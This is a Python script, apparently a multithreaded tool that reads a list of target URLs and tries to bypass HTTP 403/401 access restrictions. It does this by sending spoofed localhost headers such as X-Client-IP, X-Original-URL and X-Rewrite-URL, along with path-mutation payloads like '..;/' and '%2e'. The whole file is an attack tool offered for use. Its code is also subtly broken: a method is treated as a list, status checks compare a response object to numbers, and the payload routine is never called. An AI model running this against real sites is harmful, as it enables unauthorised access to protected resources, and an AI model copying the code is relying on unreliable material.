from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import requests
from urllib.parse import  urlparse, parse_qs,urlencode
import  urllib
import hashlib
import threading
import optparse
from test import bypass

class bypass:
    def __init__(self,url,cookies=None):
        self.url = url
        self.param = urlparse(url)
        self.host = "{}://{}".format(self.param[0], self.param[1])
        self.path = self.param[2]
        self.cookies = cookies
        self.size = len(requests.get(url,allow_redirects=False,cookies=self.cookies).content)
        self.headers = {
            'Real-Ip' : '127.0.0.1',
            'Referer' : '127.0.0.1',
            'X-Http-Host-Override' : '127.0.0.1',
            'X-Original-Remote-Addr' : '127.0.0.1',
            'X-Real-Ip' : '127.0.0.1',
            'X-Remote-Addr' : '127.0.0.1',
            'Base-host' : '127.0.0.1',
            'Http-host' : '127.0.0.1',
            'Proxy-host' : '127.0.0.1',
            'Redirect' : '127.0.0.1',
            'Referrer' : '127.0.0.1',
            'Request-Uri' : '127.0.0.1',
            'Uri' : '127.0.0.1',
            'host' : '127.0.0.1',
            'X-Http-Destinationhost' : '127.0.0.1',
            'X-Original-host' : '127.0.0.1',
            'X-Proxy-host' : '127.0.0.1',
            'X-Rewrite-host' : '127.0.0.1',
            'X-Originating-IP' : '127.0.0.1',
            'X-Remote-IP' : '127.0.0.1',
            'X-Client-IP' : '127.0.0.1',
            'X-Custom-IP-Authorization' : '127.0.0.1',

        }
        self.path_headers = {
            'X-Original-URL' : self.path,
            'X-Rewrite-URL:' : self.path,
        }
        self.paylods = [".",
                   "./",
                   ".././",
                   "*",
                   "..;/",
                   ";/",
                   "%20",
                   "%2e",
                   "~",
                   "%09",
                   "/.",
                   "/./",
                   "/*",
                   "..;/",
                   ";/",
                   "/%20",
                   "/%2e",
                   "/~",
                   "/%09",
                   ".json",
                   "\\..\\.",
                   "\\..\\.\\",
                   "..%00/",
                   "..%0d/",
                   "..%5c",
                   "..\\",
                   "..%ff\\",
                   "..%ff/",
                   "%3f",
                   "%26",
                   "%23",
                   "#",
                   "?",
                   "??",
                   "?anything"
                   ]
        self.bypass_url = []


    def is_valide(self):
        s = requests.get(self.url,allow_redirects=False,cookies=self.cookies)
        if s != 403 and s != 401 :
            return True
        else:
            return False


    def bypass_headers(self) :
        if self.is_valide():
            for header in self.headers :
                self.inspect_header( self.url,{header : self.headers[header]})
            for header in self.path_headers :
                self.inspect_header(self.host, {header : self.path_headers[header]})
            self.post({'Content-Length ' : 0})
        else:
            print("not valid")

    def inspect_header(self,url,header) :
        response = requests.get(url,headers= header,allow_redirects=False, cookies=self.cookies)
        if response.status_code != 403 and response.status_code != 401 and response.status_code != 404 :
            self.bypass_url.append([self.url, header, response.status_code,len(response.content)])
        else :
            # return 0
            print(response.status_code)


    def post(self,headers) :
        response = requests.post(self.url, headers)
        if response.status_code != 403 and response.status_code != 401 and response.status_code != 404 and self.size != len(response.content):
            self.bypass.append_url([self.url, "POST", response.status_code,len(response.content)])
        else :
            # return 0
            print(response.status_code)




    def get_payload_path(self):
        if self.path[-1] == "/" :
             return self.path[:len(self.path[2]) - 1]
        else :
            return self.path[2]

    def bypass_paylod(self):
        if self.is_valide() :
            path = self.get_payload_path()
            for payload in self.paylods :
                p = "{}{}".format(path, payload)
                url = "{}{}?{}".format(self.host, p, self.param[4])
                self.inspect_payload(url, payload)
        else:
            print("not valid")

    def inspect_payload(self,url,payload):
        response = requests.get(url, allow_redirects=False, cookies=self.cookies)
        if response.status_code != 403 and response.status_code != 401 and response.status_code != 404 :
            self.bypass.append([self.url, payload, response.status_code, len(response.content)])
        else :
            # return 0
            print(response.status_code)


    def bypass(self):
        self.bypass_headers()
        self.get_payload_path()
        return self.bypass_url


def test(url,queue,cookies=None):
    obj = bypass(url)
    queue.put(obj.bypass())



def done(queue,stop_event):
    RED = '\033[31m'
    GREEN = '\033[32m'
    RESET = '\033[0m'
    while not stop_event.is_set():
        url= queue.get()
        print("[ {}done{} ] {}".format(GREEN,RESET,url))

def pool(filename,threads,cookies):
    print("urls_path=\033[33m{}\033[0m         threads=\033[33m{}\033[0m  cookies={} ".format(filename,threads,cookies))
    queue= Queue()
    stop_event =threading.Event()
    t=threading.Thread(target=done,args=(queue,stop_event),daemon=True)
    t.start()
    Lines = open(filename, 'r').readlines()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        with open("hash.txt", 'w') as out:
            for i in Lines:
                 url= i.replace("\n", "")
                 hash = hashlib.sha224(url.encode('UTF-8')).hexdigest()
                 executor.submit(test,url,queue,cookies)
                 out.write(hash +"     "+ url + '\n')
    stop_event.set()

def cookie_it(cook):
    cookies = dict()
    for i in cook.split(";"):
        cookies[i.split("=")[0]] = i.split("=")[1]
    return cookies

def Main():
    parser = optparse.OptionParser(" help: " +\
                                   "bypass.py -f <url_fielname>  -t <threads_number> --cookie <cookies>")
    # parser.add_option("-u",dest="url",type="string",help="spicify  url")
    parser.add_option("-f",dest="filename",type="string",help="spicify file of urls")
    parser.add_option("-t",dest="threads",type="int",help="spicify nybmer of threads")
    parser.add_option("--cookie",dest="cookie",type="string",help="spicify cookies")

    (options ,args) = parser.parse_args()
    threads = 10
    cookies = None
    if (options.filename != None ) :
        filename = options.filename
        if (options.threads != None):
            threads = options.threads
        if (options.cookie != None):
            cookies = cookie_it(options.cookie)
    else:
        print(parser.usage)
        exit(1)

    pool(filename,threads,cookies)



if __name__ == '__main__':
    Main()

